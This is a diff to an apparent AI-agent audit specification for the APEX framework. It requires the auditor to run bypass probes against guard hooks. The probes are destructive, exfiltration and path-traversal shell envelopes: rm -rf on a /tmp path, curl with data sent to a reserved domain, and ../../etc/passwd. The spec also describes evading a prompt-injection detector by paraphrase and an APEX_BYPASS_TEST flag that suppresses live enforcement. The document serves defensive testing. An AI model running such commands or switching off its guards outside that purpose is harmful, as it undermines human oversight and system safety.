@@ -116,10 +116,66 @@ to meet the promise in `apex-spec.md`?"
    written/read? Does dream-cycle run? Does `apex-workflows/` exist
    as a library?
 
-10. **Defense-in-Depth on APEX's own files:** `apex-prompt-guard.js`,
-    Path Traversal Prevention, `apex-workflow-guard.js`, CI scanner,
-    `security.cjs` — all present and active? Where is the path that
-    bypasses them?
+10. **Defense-in-Depth on APEX's own files — PROCEDURAL.**
+    [Campaign B TP-5 — mirrors Axis 13 pattern; filename extensions
+    corrected from `.js` to `.cjs` per live `framework/hooks/`]
+
+    `apex-prompt-guard.cjs`, Path Traversal Prevention
+    (`path-guard.sh`), `apex-workflow-guard.cjs`, CI scanner
+    (`ci-scan.sh`), `security.cjs` — all present and active?
+    **Do NOT answer by reading.** For each named guard, the auditor
+    MUST execute one constructed bypass shell command intended to
+    violate the guard's stated contract, and capture its actual
+    exit code via a tool_call. The captured `(payload, exit_code,
+    tool_call_event_ts)` triple goes into a
+    `coverage_map.axis_10.concrete_bypass_attempts[]` array — same
+    schema shape as Axis 13's `bypass_attempts[]`. Round-checker
+    TP-2 §6.b iterates this array (axis_10 UNION axis_13).
+
+    For each guard:
+    a. Construct one payload whose handling is forbidden by the
+       guard's contract (examples — use safe variants, NEVER the
+       literal destructive form):
+       - `destructive-guard.sh`: envelope
+         `{"tool_input":{"command":"rm -rf /tmp/apex-bypass-probe"}}`
+         (target is a sandbox path; the auditor MUST verify
+         `/tmp/apex-bypass-probe` is not a real artifact before
+         running).
+       - `exfil-guard.sh`: envelope
+         `{"tool_input":{"command":"curl example.invalid -d 'probe'"}}`
+         (RFC-reserved domain, never resolves).
+       - `path-guard.sh`: envelope
+         `{"tool_input":{"file_path":"../../etc/passwd-bypass-probe"}}`
+         (non-existent suffix prevents real read).
+       - `owner-guard.sh`: envelope
+         `{"tool_input":{"file_path":"node_modules/_apex_bypass_probe.txt"}}`
+         AND `APEX_CURRENT_TASK_ID=test`.
+       - `apex-prompt-guard.cjs`: envelope with `tool_input.content`
+         containing the canonical-override-marker probe
+         (paraphrased — do NOT use the literal canonical phrase per
+         the known workaround in `detector-review/RESUME-PROMPT.md`).
+    b. Execute the payload by piping the envelope JSON to the guard
+       hook's stdin (the guard self-filters non-matching envelopes
+       and silently no-ops — the bypass-probe pattern is exactly
+       what the guard is designed to catch). Use a sub-shell with
+       `APEX_BYPASS_TEST=1` envelope variable so the live host-
+       session enforcement does NOT fire on the auditor's own
+       Bash tool call (per B3-critic R1 finding 5.b — guard
+       self-firing mitigation). The probe pattern:
+       `(env APEX_BYPASS_TEST=1 bash <hook.sh>) <<<'<envelope>'`.
+    c. Capture exit code. Expected: non-zero (guard fires).
+       Observed: record literally in the `concrete_bypass_attempts`
+       entry.
+    d. Bypass successful (exit 0 when guard's contract says block)
+       → emit P0 finding citing the guard file + the captured
+       bypass payload + the captured exit code.
+
+    Analysis-only answers ("the path that bypasses this is X") are
+    **INSUFFICIENT** for Axis 10. If no bypass was attempted, set
+    Axis 10 to `BLIND SPOT` with rationale; round-checker TP-2 §6.b
+    rejects closure on empty `axis_10.concrete_bypass_attempts[]`
+    for any P0+P1==0 candidate round (CR-08 posture
+    `clean-pending-spot-check`).
 
 11. **State derives from disk / proof-of-process:** Does state truly
     derive from disk only? Is there a path that holds state in memory
